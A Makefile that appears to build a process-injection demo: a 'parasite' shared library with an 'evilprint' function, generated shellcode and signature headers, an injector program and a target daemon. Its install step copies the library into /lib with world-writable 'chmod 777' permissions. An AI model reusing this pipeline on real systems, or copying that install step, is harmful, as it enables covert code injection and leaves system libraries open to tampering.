CC=gcc
LD=ld
CFLAGS=-m32 -DDEBUG_ENABLE=1 -O0
LDFLAGS=-melf_i386 -shared


LIBNAME:=libtest.so.1.0
EVILFUNC:=evilprint

all: $(LIBNAME) p01snr daemon

$(LIBNAME):  parasite.c
	$(CC) $(CFLAGS) -fPIC -c $< -nostdlib -o libtest.o
	$(LD) $(LDFLAGS) -o $(LIBNAME) libtest.o

daemon: daemon.c
	$(CC) $(CFLAGS) $< -o $@

p01snr: p01snr.c signatures.h shellcode.h
	$(CC) $(CFLAGS) $< -o $@

signatures.h: $(LIBNAME)
	@scripts/extract_func_sig.sh  $(LIBNAME) $(EVILFUNC) 8 > signatures.h

shellcode.h: $(LIBNAME)
	@scripts/gen_shellcode.sh $(LIBNAME) > shellcode.h

install:
	cp $(LIBNAME) /lib
	chmod 777 /lib/$(LIBNAME)

clean: 
	rm -f p01snr $(LIBNAME) daemon *.o shellcode.h signatures.h _shellcode*

.PHONY: clean install
